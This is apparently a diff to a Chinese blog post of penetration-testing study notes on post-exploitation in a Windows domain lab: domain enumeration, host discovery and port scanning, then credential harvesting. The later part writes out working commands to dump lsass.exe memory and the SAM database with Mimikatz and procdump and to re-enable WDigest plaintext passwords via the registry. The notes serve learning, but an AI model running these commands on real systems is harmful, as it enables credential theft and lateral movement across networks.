@@ -420,8 +420,8 @@
 		
 		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
 			<a><i class="kirafont icon-calendar-fill"></i>2024年03月18日</a>
-			<a><i class="kirafont icon-edit-fill"></i>1.1k 字</a>
-			<a><i class="kirafont icon-time-circle-fill"></i>大概 4 分钟</a>
+			<a><i class="kirafont icon-edit-fill"></i>7.1k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 30 分钟</a>
 		</div>
 		<h1><span id="xin-xi-sou-ji">信息搜集</span><a href="#xin-xi-sou-ji" class="header-anchor">#</a></h1><p>当渗透测试人员通过 Web 渗透或其他方式获得服务器主机的权限后，需要以该主机为跳板，对其内网环境进行渗透。对于攻陷的第一台主机，其在内网中所处的网络位置当前登录的用户、该用户有什么样的权限、其操作系统信息、网络配置信息及当前运行的进程信息等都是未知的，这就需要测试人员以当前主机为中心进行信息收集。</p>
 <h1><span id="ben-ji-ji-chu-xin-xi-sou-ji">本机基础信息搜集</span><a href="#ben-ji-ji-chu-xin-xi-sou-ji" class="header-anchor">#</a></h1><p><strong>查看当前用户、权限</strong></p>
@@ -515,7 +515,337 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">query user<br></code></pre></td></tr></table></figure>
 
 <p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318215825045.png" alt="image-20240318215825045" class="lazyload"></p>
-<h1><span id="yu-nei-xin-xi-sou-ji">域内信息搜集</span><a href="#yu-nei-xin-xi-sou-ji" class="header-anchor">#</a></h1>
+<h1><span id="yu-nei-xin-xi-sou-ji">域内信息搜集</span><a href="#yu-nei-xin-xi-sou-ji" class="header-anchor">#</a></h1><p><strong>判断是否存在域环境</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net config workstation<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324193823102.png" alt="image-20240324193823102" class="lazyload"></p>
+<p>查看当前工作站的信息，包括当前计算机名、用户名、系统版本、工作站、登录的域等</p>
+<p><strong>查看域用户信息</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user /domain  #查看所有的域用户<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324194158121.png" alt="image-20240324194158121" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user &lt;username&gt; /domain #查看指定域用户信息<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324194257681.png" alt="image-20240324194257681" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic useraccount get Caption,Domain,Description #获取所有用户的SID、所属域和用户描述信息<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324195119836.png" alt="image-20240324195119836" class="lazyload"></p>
+<blockquote>
+<p>注意，只有域用户才有权限执行域内查询操作。而计算机本地用户除非提升为本地系统权限，否则只能查询本机信息，无法查询域内信息并提示“拒绝访问”。这是因为，在域环境中，所有与域有关的查询都需要通过域控制器来实现，并且需要经过Kerberos协议进行认证。</p>
+</blockquote>
+<p><strong>查看域用户组信息</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group /domain #列出域内的所有用户组<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324195844774.png" alt="image-20240324195844774" class="lazyload"></p>
+<p>还可以通过上面的信息来指定用户组来查询详细信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain #比如这个查询域管理员组的用户<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324200516235.png" alt="image-20240324200516235" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group &quot;Domain Computers&quot; /domain #可以得到域内所有的客户端主机<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324200614099.png" alt="image-20240324200614099" class="lazyload"></p>
+<p>下面是一些常见组</p>
+<table>
+<thead>
+<tr>
+<th>域组名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Domain Admins</td>
+<td>域管理员组，包括所有的域管理员用户</td>
+</tr>
+<tr>
+<td>Domain Computers</td>
+<td>域成员主机组，包括加入域的所有工作站和服务器</td>
+</tr>
+<tr>
+<td>Domain Controllers</td>
+<td>域控制器组，包括域中的所有域控制器</td>
+</tr>
+<tr>
+<td>Domain Guests</td>
+<td>域来宾组，包括域中所有的来宾用户</td>
+</tr>
+<tr>
+<td>Domain Users</td>
+<td>域用户组，包括所有域用户</td>
+</tr>
+<tr>
+<td>Enterprise Admins</td>
+<td>企业系统管理员组，适用于域林范围</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>在默认情况下，Domain Admins 组和Enterprise Admins 组中的用户对域内所有域控制器和域成员主机拥有完全控制权限。Enterprise Admins 组是一个通用组，是域林的根域中的一个组，并且其中的成员对域林中的所有域拥有完全控制权限而 Domain Admins 组是一个全局组，只对本域拥有完全控制权限。</p>
+</blockquote>
+<p><strong>查看域内密码策略</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net accounts /domain #查询域内用户的密码策略<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324201409096.png" alt="image-20240324201409096" class="lazyload"></p>
+<p><strong>查看域控制器列表</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202036188.png" alt="image-20240324202036188" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nltest /DCLIST:hacke.testlab  #用于查询指定域内的域控主机列表<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202555802.png" alt="image-20240324202555802" class="lazyload"></p>
+<p><strong>查看主域控制器</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net time /domain<br></code></pre></td></tr></table></figure>
+
+<p>在域环境中，主域控制器会同时被用作时间服务器，使得域中所有计算机的时钟同步。执行以下命令，通过查询时间服务器来找到主域控制器的名称。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202703091.png" alt="image-20240324202703091" class="lazyload"></p>
+<p><strong>定位域控制器</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ping DC.hacke.testlab<br></code></pre></td></tr></table></figure>
+
+<p>通过上面知道目标主机的主机名后，可以直接对主机名执行ping命令，根据执行返回的内容即可得知目标主机在内网中的IP地址。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324202858493.png" alt="image-20240324202858493" class="lazyload"></p>
+<p>除此之外，域控制器往往会被用作DNS服务器，所以找到当前主机的DNS服务器地址也可以定位域控。</p>
+<p><strong>查看信任关系</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nltest /domain_trusts<br></code></pre></td></tr></table></figure>
+
+<p>域信任用于多域环境中的跨域资源的共享。一般情况下，一个域的用户只能访问本域内的资源，无法访问其他域的资源，而要想不同域之间实现互访就需要建立域信任。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324203208639.png" alt="image-20240324203208639" class="lazyload"></p>
+<h1><span id="nei-wang-zi-yuan-tan-ce">内网资源探测</span><a href="#nei-wang-zi-yuan-tan-ce" class="header-anchor">#</a></h1><p>在内网渗透中，测试人员往往需要通过各种内网扫描技术来探测内网资源的情况，为后续的横向渗透做准备，通常需要发现内网存活的主机，并探测主机的操作系统、主机开放了哪些端口、端口上运行了哪些服务、服务的当前版本是否存在已知漏洞等信息。这些信息可以帮助测试人员发现内网的薄弱资源，确定后续的攻击方向。</p>
+<h2><span id="fa-xian-nei-wang-cun-huo-zhu-ji">发现内网存活主机</span><a href="#fa-xian-nei-wang-cun-huo-zhu-ji" class="header-anchor">#</a></h2><p>渗透测试中可以根据主机情况，上传工具进行主机存货探测，也可以借助内网代理或者路由转发对目标主机所处的局域网进行探测。</p>
+<p><strong>基于ICMP发现存活主机</strong></p>
+<p>ping命令就是利用ICMP数据报来确认主机是否存活，下面命令可以循环探测整个局域网C段中存活的主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.30.%I | findstr &quot;TTL=&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324204850543.png" alt="image-20240324204850543" class="lazyload"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254)：这是一个 for 循环语句，用于迭代从 1 到 254 的数字。%I 是一个临时变量，它将在每次迭代中保存当前的数字。<br><br>@ping -w 1 -n 1 192.168.30.%I：在每次迭代中，该命令通过 ping 命令向局域网中的一个主机发送一个 ICMP 回显请求（ping 请求）。-w 1 指定超时时间为 1 毫秒，-n 1 指定只发送一个 ping 请求。192.168.30.%I 是要 ping 的目标主机的 IP 地址，其中 %I 表示当前迭代的数字。<br><br>| findstr &quot;TTL=&quot;：将前一个命令的输出通过管道传递给 findstr 命令，并使用 &quot;TTL=&quot; 作为过滤条件。findstr 命令用于在输出中查找包含指定文本的行。在这种情况下，它将筛选包含 &quot;TTL=&quot; 的行，因为这是 ICMP 回显响应中的一个标识符。<br><br>/L表示数字类型的循环，除此之外还有下面这些：<br>/F：用于从文件中读取内容进行循环。可以指定要读取的文件路径，并使用特定的分隔符将文件内容拆分成多个部分进行迭代。<br><br>/R：用于递归地在目录结构中进行循环。可以指定一个目录路径，并在指定的目录及其子目录中进行递归遍历。<br><br>/D：用于循环遍历指定目录中的文件夹。<br><br>/IN：用于指定一个字符串列表，将列表中的每个字符串作为循环的一部分进行迭代。<br></code></pre></td></tr></table></figure>
+
+<p><strong>基于 NetBIOS(网络基本输入&#x2F;输出系统)协议发现存活主机</strong></p>
+<p>NetBIOS 提供 OSI&#x2F;RM的会话层(在TCP&#x2F;IP模型中包含在应用层中)服务，让不同计算机上运行的不同程序可以在局域网中互相连接和共享数据。</p>
+<p>NetBIOS 的工作流程就是正常的机器名解析、查询、应答的过程。在 Windows 中，默认安装 TCP&#x2F;IP 后会自动安装 NetBIOS。</p>
+<p>在实际利用时，向局域网的每个IP地址发送NetBIOS状态查询，可以获得主机名MAC 地址等信息。</p>
+<blockquote>
+<p>NBTScan 是一款用于扫描 Windows 网络上NetBIOS 名称的程序,用于发现内网中存活的 Windows 主机。NBTScan 可以对给定IP范围内的每个IP地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，会列出它的IP地址NetBIOS计算机名、登录用户名和MAC地址。工具地址：<a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p>
+</blockquote>
+<p>将工具上传到主机之后执行下面命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nbtscan 192.168.30.1/24<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324212209943.png" alt="image-20240324212209943" class="lazyload"></p>
+<p><strong>基于UDP发现存活主机</strong></p>
+<p>在实际利用中，可以将一个空的UDP报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，UDP探测就马上得到一个ICMP端口无法到达的回应报文，这意味着该主机正在运行。如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应。</p>
+<p>Unicornscan 是Kali Linux平台的一款信息收集工具，提供了网络扫描功能。执行以下命令，通过 UDP协议扫描内网的存活主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">unicornscan -mU 192.168.30.1/24<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324212621176.png" alt="image-20240324212621176" class="lazyload"></p>
+<p><strong>基于ARP发现存活主机</strong></p>
+<p>在实际利用中，可以向网络发送一个ARP请求，若目标主机处于活跃状态，则其一定会回应一个 ARP 响应，否则不会做出任何回应。</p>
+<ul>
+<li>利用ARP-Scan</li>
+</ul>
+<p>ARP-Scan 是一款快速、便捷的内网扫描工具，利用 ARP 发现内网中存活的主机。将工具上传到目标主机，执行以下命令，即可扫描内网中存活的主机。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp-scan -t 192.168.30.1/24<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324213635193.png" alt="image-20240324213635193" class="lazyload"></p>
+<ul>
+<li>利用powershell</li>
+</ul>
+<p>Empire 渗透框架的 Invoke-ARPScan.psl脚本可利用 ARP发现内网存活主机，工具地址：<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire%E3%80%82(%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%E7%94%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%B2%A1%E6%89%BE%E5%88%B0powershell%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%A5%BD%E5%83%8F%E6%98%AF%E5%B7%B2%E7%BB%8F%E5%8F%96%E6%B6%88%E4%BA%86%EF%BC%8C%E6%8A%8A%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%BE%E8%BF%99)%E4%BD%BF%E7%94%A8%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%B0%86%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%85%A5%E6%89%A7%E8%A1%8C">https://github.com/EmpireProject/Empire。(暂时不会用，因为没找到powershell脚本，好像是已经取消了，把使用命令放这)使用时，需要将脚本导入执行</a>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-ARPScan.ps1<br>Invoke-ARPScan -CIDR 192.168.30.1/24<br></code></pre></td></tr></table></figure>
+
+<p><strong>基于 SMB(Server Message Block，服务器消息块)协议发现存活主机</strong></p>
+<p>SMB 又称为网络文件共享系统(CommonInternetFileSystem，CIFS)协议，是一种应用层传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通信等资源。CIFS 消息一般使用 NetBIOS 或 TCP 发送，分别使用139或 445 端口目前倾向于使用 445 端口。</p>
+<p>在实际利用中，可以探测局域网中存在的SMB 服务，从而发现内网的存活主机，多适用于 Windows 主机的发现。</p>
+<p>CrackMapExec(简称CME)是一款十分强大的后渗透利用工具，在KaliLinux上可以直接使用 apt-get命令进行安装。CrackMapExec能够枚举登录用户、枚举SMB服务列表、执行 WINRM 攻击等功能，可以帮助测试人员自动化评估大型域网络的安全性.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.30.1/24<br></code></pre></td></tr></table></figure>
+
+<p>我的kali不在同一个网络检测不了，检测出来的效果如下：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324215607566.png" alt="image-20240324215607566" class="lazyload"></p>
+<h2><span id="nei-wang-duan-kou-sao-miao">内网端口扫描</span><a href="#nei-wang-duan-kou-sao-miao" class="header-anchor">#</a></h2><p>端口扫描就是用于探测主机开启了哪些服务，从而查找相应的漏洞进行攻击</p>
+<p><strong>利用Telnet探测端口</strong></p>
+<p>Telnet 是进行远程登录的标准协议和主要方式,为用户提供了在本地计算机上完成远程主机工作的能力。telnet命令可以简单测试指定的端口号是正常打开还是关闭状态。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324221045451.png" alt="image-20240324221045451" class="lazyload"></p>
+<p><strong>利用nmap进行端口扫描</strong></p>
+<p>Nmap 是一个十分强大的端口扫描工具,在实际利用中可以借助内网代理对内网主机进行端口扫描。nmap的使用需要好好去学习，到时查查资料学习。</p>
+<p>下面是一些常用的扫描命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -p 80,88,135,139,443,8080,3306,3389 172.25.87.14 #扫描目标主机的指定端口<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324221409497.png" alt="image-20240324221409497" class="lazyload"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">namp -sS -p 1-65535 172.25.87.14 #扫描目标主机的全部端口<br><br>nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #扫描并获取目标主机指定端口上开放的服务版本<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用PowerShell进行端口扫描</strong></p>
+<p>NiShang 是基于PowerShell 的渗透测试专用框架，集成了各种脚本和Payload，广泛用于渗透测试的各阶段。<br>NiShang 的 Scan 模块中也有一个 Invoke-PortsCan.ps1 脚本，可以用来对主机进行端口扫描，工具地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang%E3%80%82">https://github.com/samratashok/nishang。</a></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324222008156.png" alt="image-20240324222008156" class="lazyload"></p>
+<p>执行下面命令对内网的一个主机范围执行默认的端口扫描，这里要先用管理员权限修改成可以执行脚本策略，然后导入模块再使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-PortScan.ps1<br>Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.20 -ResolveHost -ScanPort<br><span class="hljs-meta prompt_">#</span><span class="language-bash">还可以在后面再加上一个-Port选项指定扫描端口</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324223527832.png" alt="image-20240324223527832" class="lazyload"></p>
+<p><strong>利用MetaSploit探测内网</strong></p>
+<p>MetaSploit 渗透框架中内置了几款资源收集模块，可用于发现内网存活主机、探测内网服务、对目标主机进行端口扫描，如图：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324223901678.png" alt="image-20240324223901678" class="lazyload"></p>
+<p><strong>获取端口Banner信息</strong></p>
+<p>Banner 中可能包含一些敏感信息。通过查看端口的Banner，测试人员往往可以获取软件开发商、软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用。</p>
+<ul>
+<li><p>利用NetCat获取端口Banner</p>
+<p>Netcat 是一款常用的测试工具和黑客工具，使用 NetCat 可以轻易建立任何连接，具有“瑞士军刀”的美誉。</p>
+<p>通过-nv选项可以在连接端口时获取该端口的Banner信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -nv &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324225257083.png" alt="image-20240324225257083" class="lazyload"></p>
+</li>
+<li><p>利用Telnet获取端口Banner</p>
+<p>如果目标端口开放，使用Telnet连接后，也会返回相应的Banner信息.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>利用Nmap获取端口Banner</p>
+<p>在Nmap中指定脚本**–script&#x3D;banner**就可以在扫描中获取端口的banner信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1><span id="yong-hu-ping-ju-shou-ji">用户凭据收集</span><a href="#yong-hu-ping-ju-shou-ji" class="header-anchor">#</a></h1><p>在内网渗透中，当测试人员获取某台机器的控制权后，会以被攻陷的主机为跳板进行横向渗透，进一步扩大所掌控的资源范围。但是横向渗透中的很多攻击方法都需要先获取到域内用户的密码或哈希值才能进行，如哈希传递攻击、票据传递攻击等。所以在进行信息收集时，要尽可能收集域内用户的登录凭据等信息</p>
+<h2><span id="huo-qu-yu-nei-dan-ji-mi-ma-he-ha-xi-zhi">获取域内单机密码和哈希值</span><a href="#huo-qu-yu-nei-dan-ji-mi-ma-he-ha-xi-zhi" class="header-anchor">#</a></h2><blockquote>
+<p>在 Windows中,SAM文件是 Windows用户的账户数据库,位于系统的%SystemRoot%System32\Config 目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值对比，若相同，则认证成功。</p>
+<p>lsass.exe是Windows的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后，登录的域名、用户名和登录凭据等信息会存储在lsass.exe的进程空间中，用户的明文密码经过 WDigest和 Tspkg模块调用后,会对其使用可逆的算法进行加密并存储在内存中。</p>
+<p>用来获取主机的用户密码和哈希值的工具有很多,这些工具大多是通过读取 SAM 文件或者访问 lsass.exe 进程的内存数据等操作实现的。这些操作大多需要管理员权限，这意味着需要配合一些提权操作。</p>
+</blockquote>
+<p>下面利用Mimikatz工具来进行学习，Mimikatz是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域</p>
+<p><strong>在线读取lsass进程内存</strong></p>
+<p>将mimikatz上传到主机执行下面命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；sekurlsa::logonpasswords用于导出用户凭据</span><br></code></pre></td></tr></table></figure>
+
+<p>可直接从lsass.exe进程的内存中读取当前已登录用户的凭据</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324232522666.png" alt="image-20240324232522666" class="lazyload"></p>
+<p>不过我这里失败了不知道为什么，成功的话应该是下面这样</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324233242439.png" alt="image-20240324233242439" class="lazyload"></p>
+<p>后来试了一下需要管理员权限，那应该是提权之后的事情了这一步</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324233522901.png" alt="image-20240324233522901" class="lazyload"></p>
+<p><strong>离线读取lsass内存文件</strong></p>
+<p>除了在线读取，也可以直接将Isass.exe的进程内存转储，将内存文件导出到本地后使用 Mimikatz 进行离线读取。用于转储进程内存的工具有很多，如 OutMinidump.ps1、Procdump、SharpDump等，甚至可以手动加载系统自带的comsvcs.dll 来实现内存转储。</p>
+<p>这里用微软官方提供的Procdump工具，首先要在主机上传该程序，然后执行下面命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">procdump.exe -accepteula -ma lsass.exe lsass.dmp #将lsass.exe的进程转储<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324234127358.png" alt="image-20240324234127358" class="lazyload"></p>
+<p>然后再执行下面命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sekurlsa::minidump lsass.dmp用于加载内存文件；sekurlsa::logonpasswords用于导出用户凭据； full 参数表示要输出全部可用的明文凭据信息，包括密码等详细信息；<span class="hljs-built_in">exit</span> 参数表示退出 Mimikatz 工具，结束当前会话。</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324234639154.png" alt="image-20240324234639154" class="lazyload"></p>
+<blockquote>
+<p>注意,为了防止用户的明文密码在内存中泄露,微软在2014年5月发布了KB2871997补丁，关闭了 WDigest 功能，禁止从内存中获取明文密码，且 Windows Server 2012 及以上版本默认关闭 WDigest 功能。但是测试人员通过修改注册表，可以重新开启 WDigest功能，当用户注销或者重新登录后，就可以重新获取到用户的明文密码。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure>
+
+<p><strong>在线读取SAM文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br><span class="hljs-meta prompt_">#</span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；token::elevate用于提升至SYSTEM权限；用于读取本地的SAM文件</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325001115648.png" alt="image-20240325001115648" class="lazyload"></p>
+<p>读取 SAM 文件中保存的用户登录凭据，可以导出当前系统中所有本<br>地用户的哈希值。</p>
+<p><strong>离线读取SAM文件</strong></p>
